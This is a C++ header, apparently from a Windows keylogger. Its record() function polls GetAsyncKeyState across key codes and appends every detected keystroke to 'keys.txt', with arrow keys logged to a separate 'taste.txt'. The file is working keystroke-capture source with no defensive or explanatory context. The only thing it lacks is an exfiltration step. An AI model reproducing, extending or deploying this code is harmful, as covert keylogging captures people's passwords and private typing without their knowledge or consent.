#pragma once
#include "includes.h"

using namespace std;


void LOG(string input) {
	fstream LogFile;
	LogFile.open("taste.txt", fstream::app);
	if (LogFile.is_open()) {
		LogFile << input;
		LogFile << " ";
		LogFile.close();
	}
}


bool SpecialKeys(int key) {
	switch (key) {

	case VK_UP:
		LOG("VK_UP");
		return true;
	case VK_DOWN:
		LOG("VK_DOWN");
		return true;
	case VK_LEFT:
		LOG("VK_LEFT");
		return true;
	case VK_RIGHT:
		LOG("VK_RIGHT");
		return true;
	default:
		return false;
	}
}



void record()
{
	char KEY = 'x';

	for (int KEY = 8; KEY <= 190; KEY++)
	{

		if (GetAsyncKeyState(KEY) == -32767) 
		{
			if (SpecialKeys(KEY) == false) 
			{
				fstream LogFile;
				LogFile.open("keys.txt", fstream::app);
				if (LogFile.is_open()) {
					LogFile << char(KEY);
					LogFile << " ";
					LogFile.close();
				}
			}
		}
	}
}

